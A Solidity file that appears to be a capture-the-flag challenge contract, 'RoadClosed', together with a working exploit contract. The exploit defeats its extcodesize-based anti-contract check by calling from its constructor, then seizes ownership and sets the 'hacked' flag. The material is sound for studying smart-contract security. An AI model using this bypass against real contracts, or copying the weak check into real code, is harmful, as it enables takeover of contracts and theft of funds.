// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.7;

contract RoadClosed {
    bool hacked;
    address owner;
    address pwner;
    mapping(address => bool) whitelistedMinters;

    function isContract(address addr) public view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(addr)
        }
        return size > 0;
    }

    function isOwner() public view returns (bool) {
        if (msg.sender == owner) {
            return true;
        } else return false;
    }

    constructor() {
        owner = msg.sender;
    }

    function addToWhitelist(address addr) public {
        require(!isContract(addr), "Contracts are not allowed");
        whitelistedMinters[addr] = true;
    }

    function changeOwner(address addr) public {
        require(whitelistedMinters[addr], "You are not whitelisted");
        require(msg.sender == addr, "address must be msg.sender");
        require(addr != address(0), "Zero address");
        owner = addr;
    }

    function pwn(address addr) external payable {
        require(!isContract(msg.sender), "Contracts are not allowed");
        require(msg.sender == addr, "address must be msg.sender");
        require(msg.sender == owner, "Must be owner");
        hacked = true;
    }

    function pwn() external payable {
        require(msg.sender == pwner);
        hacked = true;
    }

    function isHacked() public view returns (bool) {
        return hacked;
    }
}

contract ExploitRoadClosed {
    RoadClosed public target;

    constructor(address _targetAddress) {
        target = RoadClosed(_targetAddress);
        _attack();
    }

    function _attack() internal {
        // bypassing the isContract() check
        target.addToWhitelist(address(this));
        // taking control of the smart contract
        target.changeOwner(address(this));
        // changing the value of hacked to true
        target.pwn(address(this));
    }
}
